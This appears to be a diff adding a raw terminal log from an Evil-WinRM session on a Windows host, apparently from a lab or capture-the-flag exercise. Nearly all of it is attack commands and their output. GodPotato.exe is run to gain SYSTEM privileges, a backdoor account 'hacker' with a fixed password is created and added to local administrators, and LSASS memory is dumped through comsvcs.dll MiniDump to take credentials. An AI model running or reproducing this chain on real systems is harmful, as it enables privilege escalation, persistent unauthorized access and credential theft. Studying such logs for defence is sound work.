@@ -1,0 +1,136 @@
+   + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.MoveItemCommand
+*Evil-WinRM* PS C:\Users\jeor.mormont\Documents> .\GodPotato.exe -cmd "whoami"
+[*] CombaseModule: 0x140714746314752
+[*] DispatchTable: 0x140714748628160
+[*] UseProtseqFunction: 0x140714748006176
+[*] UseProtseqFunctionParamCount: 6
+[*] HookRPC
+[*] Start PipeServer
+[*] CreateNamedPipe \\.\pipe\ac0858cf-ae42-444a-bac9-5104b269d635\pipe\epmapper
+[*] Trigger RPCSS
+[*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046
+[*] DCOM obj IPID: 00000802-0c2c-ffff-2162-1bb952299277
+[*] DCOM obj OXID: 0x6e5db5f76179277c
+[*] DCOM obj OID: 0x507b47fdeaf7a7a1
+[*] DCOM obj Flags: 0x281
+[*] DCOM obj PublicRefs: 0x0
+[*] Marshal Object bytes len: 100
+[*] UnMarshal Object
+[*] Pipe Connected!
+[*] CurrentUser: NT AUTHORITY\NETWORK SERVICE
+[*] CurrentsImpersonationLevel: Impersonation
+[*] Start Search System Token
+[*] PID : 864 Token:0x756  User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation
+[*] Find System Token : True
+[*] UnmarshalObject: 0x80070776
+[*] CurrentUser: NT AUTHORITY\SYSTEM
+[*] process start with pid 4320
+*Evil-WinRM* PS C:\Users\jeor.mormont\Documents> .\GodPotato.exe -cmd "cmd /c net user hacker Password123! /add"
+[*] CombaseModule: 0x140714746314752
+[*] DispatchTable: 0x140714748628160
+[*] UseProtseqFunction: 0x140714748006176
+[*] UseProtseqFunctionParamCount: 6
+[*] HookRPC
+[*] Start PipeServer
+[*] Trigger RPCSS
+[*] CreateNamedPipe \\.\pipe\e1febd00-2900-4b09-bd0d-56bc1d790b9d\pipe\epmapper
+[*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046
+[*] DCOM obj IPID: 00006c02-1928-ffff-1a4d-80165dd01af9
+[*] DCOM obj OXID: 0xa72292d1e1938742
+[*] DCOM obj OID: 0xb2809976b6673beb
+[*] DCOM obj Flags: 0x281
+[*] DCOM obj PublicRefs: 0x0
+[*] Marshal Object bytes len: 100
+[*] UnMarshal Object
+[*] Pipe Connected!
+[*] CurrentUser: NT AUTHORITY\NETWORK SERVICE
+[*] CurrentsImpersonationLevel: Impersonation
+[*] Start Search System Token
+[*] PID : 864 Token:0x756  User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation
+[*] Find System Token : True
+[*] UnmarshalObject: 0x80070776
+[*] CurrentUser: NT AUTHORITY\SYSTEM
+[*] process start with pid 2784
+The command completed successfully.
+
+*Evil-WinRM* PS C:\Users\jeor.mormont\Documents> .\GodPotato.exe -cmd "cmd /c net localgroup administrators hacker /add"
+[*] CombaseModule: 0x140714746314752
+[*] DispatchTable: 0x140714748628160
+[*] UseProtseqFunction: 0x140714748006176
+[*] UseProtseqFunctionParamCount: 6
+[*] HookRPC
+[*] Start PipeServer
+[*] Trigger RPCSS
+[*] CreateNamedPipe \\.\pipe\d624f950-2432-442d-b5a7-5bee8a961ea6\pipe\epmapper
+[*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046
+[*] DCOM obj IPID: 00002802-09f8-ffff-07de-20a5c59ce61f
+[*] DCOM obj OXID: 0xd2ef30826d05d200
+[*] DCOM obj OID: 0xfaf06011fa0204f
+[*] DCOM obj Flags: 0x281
+[*] DCOM obj PublicRefs: 0x0
+[*] Marshal Object bytes len: 100
+[*] UnMarshal Object
+[*] Pipe Connected!
+[*] CurrentUser: NT AUTHORITY\NETWORK SERVICE
+[*] CurrentsImpersonationLevel: Impersonation
+[*] Start Search System Token
+[*] PID : 864 Token:0x756  User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation
+[*] Find System Token : True
+[*] UnmarshalObject: 0x80070776
+[*] CurrentUser: NT AUTHORITY\SYSTEM
+[*] process start with pid 6320
+The command completed successfully.
+
+*Evil-WinRM* PS C:\Users\jeor.mormont\Documents> .\GodPotato.exe -cmd "cmd /c rundll32 C:\windows\System32\comsvcs.dll MiniDump 624 C:\Windows\Temp\lsass.dmp full"
+[*] CombaseModule: 0x140714746314752
+[*] DispatchTable: 0x140714748628160
+[*] UseProtseqFunction: 0x140714748006176
+[*] UseProtseqFunctionParamCount: 6
+[*] HookRPC
+[*] Start PipeServer
+[*] CreateNamedPipe \\.\pipe\2c338ff7-0c0a-4339-b85e-f0fa6494d10c\pipe\epmapper
+[*] Trigger RPCSS
+[*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046
+[*] DCOM obj IPID: 00003802-0e40-ffff-7dae-413209033d8e
+[*] DCOM obj OXID: 0x118d6867cdc6605b
+[*] DCOM obj OID: 0xd0ddb700e105eace
+[*] DCOM obj Flags: 0x281
+[*] DCOM obj PublicRefs: 0x0
+[*] Marshal Object bytes len: 100
+[*] UnMarshal Object
+[*] Pipe Connected!
+[*] CurrentUser: NT AUTHORITY\NETWORK SERVICE
+[*] CurrentsImpersonationLevel: Impersonation
+[*] Start Search System Token
+[*] PID : 864 Token:0x756  User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation
+[*] Find System Token : True
+[*] UnmarshalObject: 0x80070776
+[*] CurrentUser: NT AUTHORITY\SYSTEM
+[*] process start with pid 824
+*Evil-WinRM* PS C:\Users\jeor.mormont\Documents> .\GodPotato.exe -cmd "cmd /c tasklist | findstr lsass"
+[*] CombaseModule: 0x140714746314752
+[*] DispatchTable: 0x140714748628160
+[*] UseProtseqFunction: 0x140714748006176
+[*] UseProtseqFunctionParamCount: 6
+[*] HookRPC
+[*] Start PipeServer
+[*] Trigger RPCSS
+[*] CreateNamedPipe \\.\pipe\a91ff09e-16ab-496b-8ffe-be72d04139d4\pipe\epmapper
+[*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046
+[*] DCOM obj IPID: 0000f402-1260-ffff-168c-7797a5535d14
+[*] DCOM obj OXID: 0xc4588206caeba3c5
+[*] DCOM obj OID: 0x7ff38b41bc78bc4f
+[*] DCOM obj Flags: 0x281
+[*] DCOM obj PublicRefs: 0x0
+[*] Marshal Object bytes len: 100
+[*] UnMarshal Object
+[*] Pipe Connected!
+[*] CurrentUser: NT AUTHORITY\NETWORK SERVICE
+[*] CurrentsImpersonationLevel: Impersonation
+[*] Start Search System Token
+[*] PID : 864 Token:0x756  User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation
+[*] Find System Token : True
+[*] UnmarshalObject: 0x80070776
+[*] CurrentUser: NT AUTHORITY\SYSTEM
+[*] process start with pid 5036
+*Evil-WinRM* PS C:\Users\jeor.mormont\Documents> 
